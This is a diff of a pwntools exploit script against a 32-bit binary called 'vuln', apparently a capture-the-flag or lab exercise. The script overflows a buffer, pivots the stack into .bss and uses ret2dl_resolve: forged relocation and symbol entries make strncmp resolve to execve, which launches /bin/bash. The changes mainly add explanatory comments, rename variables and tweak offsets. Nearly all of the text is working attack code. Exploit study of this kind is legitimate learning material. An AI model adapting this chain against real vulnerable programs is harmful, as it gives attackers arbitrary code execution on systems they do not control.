@@ -17,10 +17,11 @@ if LOCAL:
     r = process(fname,aslr=True)
 
     gdbscript="""
+    b *0x08048380
+    b *read
     """
 
-    #    b *0x08048380
-    #    b *read
+
     #set follow-fork-mode
 
     attach('vuln',gdbscript=gdbscript)
@@ -91,67 +92,89 @@ def pwn():
     rop = ROP(elf)
     bss_addr = elf.bss()
 
-    stack_size = 0x200
-    base_stage = int(bss_addr + stack_size + 0x20)
-
-    print(hex(base_stage))
-
-    ################
-    # stack pivote #
-    ################
-    rop.raw(crashing_input[:-overflow])
-    rop.raw(b'a'*12)
-    rop.raw(b'b'*4)
-    rop.read(0,base_stage,100)
-    rop.migrate(base_stage)
-    sl(rop.chain())
-
-
-    ##################
-    # ret2dl_resolve #
-    ##################
-    
     #get sections
     plt0 = elf.get_section_by_name('.plt').header.sh_addr
     rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
     dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
     dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
+    gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
 
 
-    #create fake symbol @ base_stage + 32 + align
-    fake_sym_addr = base_stage + 32
-    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
-    fake_sym_addr = fake_sym_addr + align
+    #we need to find a fake_frame_addr that have a specific r_info that in 
+    # <_dl_fixup+108>  movzx  edx, WORD PTR [edx+esi*2]
+    #[edx+esi*2] point to a addr that contains a word (2bytes) of 0x0000
+    #edx = 0x080482dc esi=r_info (our r_info = will be 30e)
 
-    index_dynsym = int((fake_sym_addr - dynsym) / 0x10)
-    st_name = fake_sym_addr + 0x10 - dynstr
-    fake_sym = flat([st_name, 0, 0, 0x12])
+    #found out with dynamic testing/debugging that i have to adjust the fake_frame_addr by adding 0x220
+    addr_adj = 0x220
+    fake_frame_addr = int(bss_addr + addr_adj)
+    print(f'fake_frame_addr = {hex(fake_frame_addr)}')
 
+    ################
+    # stack pivote #
+    ################
+    rop.raw(crashing_input[:-overflow])
+    rop.raw(b'a'*12)                        #pad
+    rop.raw(b'b'*4)                         #ebp
+    rop.read(0,fake_frame_addr,100)
+    rop.migrate(fake_frame_addr)
+    sl(rop.chain())
+    
+    ###############################################################
+    # calculate the offset from rel.plt to our fake_rel_plt entry #
+    ###############################################################
+    fake_dlresolve_index = fake_frame_addr + 24 - rel_plt
 
-    #create fake read relocation @ base_stage + 24
-    index_offset = base_stage + 24 - rel_plt
-    read_got = elf.got['strncmp']
-    r_info = (index_dynsym << 8) | 0x7
-    fake_read_reloc = flat([read_got,r_info])
+    ##########################################################
+    # calculate and align the addr for our fake_dynsym entry #
+    ##########################################################
+    
+    fake_dynsym_addr = fake_frame_addr + 32
+    print(f'dynsym_addr = {hex(dynsym)}')
+    print(f'fake_dynsym_addr = {hex(fake_dynsym_addr)} this addr need to be 0x10 byte aligned to the dynsym')
+
+    #here we get the last nibl of the fake_dynsym_addr and calculate the alignment
+    align = 0x10 - ((fake_dynsym_addr - dynsym) & 0xf)
+    print(f'align = {hex(align)}')
+
+    #calculate final fake_dynsym_addr
+    fake_dynsym_addr = fake_dynsym_addr + align
+    print(f'our final fake_dynsym_addr = {hex(fake_dynsym_addr)}')
+
+    ##################################################################################################
+    # calculate the offset from dynstr to our fake string = st_name and create the fake_dynsym struct#
+    ##################################################################################################
+    
+    fake_st_name = fake_dynsym_addr + 0x10 - dynstr
+    fake_dynsym = flat([fake_st_name, 0, 0, 0x12])
+
+    ##########################################################################################
+    # calculate the offset from dynsym to our fake_dynsym = r_info and create the fake_rel_plt struct #
+    ##########################################################################################
+
+    fake_r_info = int((fake_dynsym_addr - dynsym) / 0x10)
+    fake_r_offset = elf.got['strncmp']
+    fake_r_info = (fake_r_info << 8) | 0x7
+    fake_rel_plt = flat([fake_r_offset,fake_r_info])
     
     sleep(1)
 
     rop = ROP(elf)
     sh = b'/bin/bash\x00'
 
-    rop.raw(plt0)
-    rop.raw(index_offset)
-    rop.raw(elf.plt['strncmp'])
-    rop.raw(base_stage + 80)
-    rop.raw(0)
-    rop.raw(0)
-    rop.raw(fake_read_reloc)
-    rop.raw('a'*align)
-    rop.raw(fake_sym)
-    rop.raw(b'execve\x00')
+    rop.raw(plt0)                               #0-4
+    rop.raw(fake_dlresolve_index)               #4-8
+    rop.raw(elf.plt['strncmp'])                 #8-12
+    rop.raw(fake_frame_addr + 80)               #12-16
+    rop.raw(0x00)                               #16-20
+    rop.raw(0x00)                               #20-24
+    rop.raw(fake_rel_plt)                       #24-32  rel.plt + (fake_dlresolve_index * 0x10)
+    rop.raw('a'*align)                          #32-36 
+    rop.raw(fake_dynsym)                        #36-52
+    rop.raw(b'execve\x00')                      #52-59
     rop.raw('a'*(80 - len(rop.chain())))
     rop.raw(sh)
-    rop.raw('a'*(100 - len(rop.chain())))
+
     sl(rop.chain())
 
     sl(b'echo "DONE" > log')
